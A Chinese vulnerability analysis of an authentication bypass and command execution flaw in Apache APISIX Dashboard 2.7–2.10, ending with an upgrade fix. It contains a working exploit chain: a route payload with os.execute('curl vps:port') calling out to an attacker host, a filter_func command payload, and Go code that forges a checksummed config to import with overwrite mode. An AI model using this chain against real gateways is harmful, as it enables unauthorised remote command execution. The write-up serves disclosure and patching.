<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wQIMZfmGkOrfBj4ZjKU-0Q)

01

漏洞描述

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmswicTDgHF9GMcHhIM8kYfntL2x75048J6ozwC3Hr3UAIMVicn9ibY46Aw/640?wx_fmt=png)

**Apache APISIX** 是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。

你可以使用 Apache APISIX 来处理传统的南北向流量，以及服务间的东西向流量， 也可以当做 k8s ingress controller 来使用。

攻击者可构造恶意请求，导入恶意配置，执行任意命令。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmswicTDgHF9GMcHhIM8kYfntL2x75048J6ozwC3Hr3UAIMVicn9ibY46Aw/640?wx_fmt=png)

02

漏洞分析

后台的主要代码位于 api/internal，先看到：api/internal/route.go 首先注册了一系列 handler：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmLC7qPUrBUDiclBfOZhTPRdftFH2WHQBRkooHwosiaAdlMwPfsGqVfO2w/640?wx_fmt=png)  

对应于 api/internal/handler 内的包。

因为是认证绕过，首先看一下项目的鉴权方面，其采用的是 github.com/ShiningRush/droplet 项目，位于 api/cmd/root.go 中添加了用户认证的 filter：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmIWQm9KPIoxjuMibzfJYlTdYe9OjJAjIzYp8rq0OHnqSshaKU6egfK0A/640?wx_fmt=png)

快进到 api/internal/filter/authentication.go：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDm7dbScNP7zsZKDpwFCPz6mmJB4al3xqMxR89mFH3EQkX3ESoN47E6Kg/640?wx_fmt=png)

会发现除了 version 和 login 页面外，凡是以 / apisix 为前缀的 api 都需要鉴权，而其呈现在代码中的形式就如 api/internal/handler/service 会有如下的呈现形式 wgin.Wraps：![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmfnBaXCNK20gMwXsPLnwjcrPyY9YAqABwoAWibic47U6WKxl6lRkvsLzw/640?wx_fmt=png)

根据流出的具有漏洞的 url：`/apisix/admin/migrate/export`![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmRVX99GXicC0p7lQmaoVxR6mPYicYIY5H06AMegJpD3tsvfABOPS1sVPQ/640?wx_fmt=png)

会发现这部分没有经过 droplet 的处理导致了认证绕过，好吧，原理很简单，通过 export 就可以导出配置文件了，下面看一下怎么进一步利用。

看了一圈发现也就只有这里的鉴权没有写好，因此漏洞点还是回到了这里，还有一处 import，那么就想到是否是导入配置文件导致命令执行，根据网上流传的两个截图流出的关键点，一是 filter_func，二是 script。

filter_func 的使用介绍可看：https://apisix.apache.org/zh/docs/apisix/2.7/admin-api/

> 用户自定义的过滤函数。可以使用它来实现特殊场景的匹配要求实现。该函数默认接受一个名为 vars 的输入参数，可以用它来获取 Nginx 变量。

script 的使用介绍可看：https://apisix.apache.org/zh/docs/apisix/architecture-design/script

> 理论上，在 `Script` 中可以写任意 lua 代码，也可以直接调用已有插件以重用已有的代码。

实际上二者的利用原理都是处理路由时可无过滤执行任意 lua 代码。

本地创建一个路由随后添加上 script，script 处放入任意 lua 代码：

```
{
"uris": [
  "/test"
],
"name": "test",
"methods": [
  "GET",
  "POST",
  "PUT",
  "DELETE",
  "PATCH",
  "HEAD",
  "OPTIONS",
  "CONNECT",
  "TRACE"
],
"script": "os.execute('curl vps:port')",
"script_id": "388133775432745673",
"upstream": {
  "nodes": [],
  "type": "roundrobin",
  "scheme": "http"
},
"status": 1
}
```

filter_func 的话代码需要放函数，for example:

```
"filter_func":"function(vars) os.execute('ls>/tmp/success');return true end"
```

我们需要通过 import 导入，不过在导入之前需要计算 checksum。

什么是 checksum？我们在调用 export 导出时能看到如下最后的 4 个字符：  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDme7uXE871xX7hfHLUrspwarKu96Vdsibv3bax6xQ0NvHrz50MdMjY7gw/640?wx_fmt=png)

这四个就是 checksum，对应的计算方式在项目代码中也有呈现，因此直接抓出来就可以用了。

```
package main

import (
"encoding/binary"
"hash/crc32"
"io/ioutil"
"os"
)

const (
exportFileName = "apisix-config.bak"
checksumLength = 4 // 4 bytes (uint32)
)
func main() {
 data := []byte(`<data>`)
 checksumUint32 := crc32.ChecksumIEEE(data)
 checksum := make([]byte, checksumLength)
 binary.BigEndian.PutUint32(checksum, checksumUint32)
 fileBytes := append(data, checksum...)
 content := fileBytes
 ioutil.WriteFile("poc",content,os.ModePerm)
}
```

生成的 poc 就是我们需要覆盖的配置文件，此时我们先把路由删除，模拟在只有认证绕过的情况下的场景。

先不谈怎么利用，继续分析，回看到 import 路由，需求参数有 mode 和 file：![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmKqx6RtcmP5IP6yhialntmW3ylvJlDX94tnn2VoHh7dUc1ia2tXjbJGDw/640?wx_fmt=png)

file 自不必说，看一下 mode：

```
return\overwrite\skip
```

很显然 overwrite 就是重写配置文件了，因此 post 一下前面计算完 checksum 得到的 poc 以及 mode=overwrite，随后访问 apisix 的 / test 即可成功验证漏洞。

03

影响版本及修复建议

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmswicTDgHF9GMcHhIM8kYfntL2x75048J6ozwC3Hr3UAIMVicn9ibY46Aw/640?wx_fmt=png)

影响版本: 2.7-2.10

修复建议: 升级至最新安全版本 Apache APISIX Dashboard 2.10.1：https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQJZVs4QmiaS9FSa0SrTjSDmswicTDgHF9GMcHhIM8kYfntL2x75048J6ozwC3Hr3UAIMVicn9ibY46Aw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT8IBZrzlbyNvOySykxbUIQXsTh4RvcuSd2lY6IB1hvnPXDmmicYOS0CtDziaMMyp4DfruRwBeicaVsQ/640?wx_fmt=png)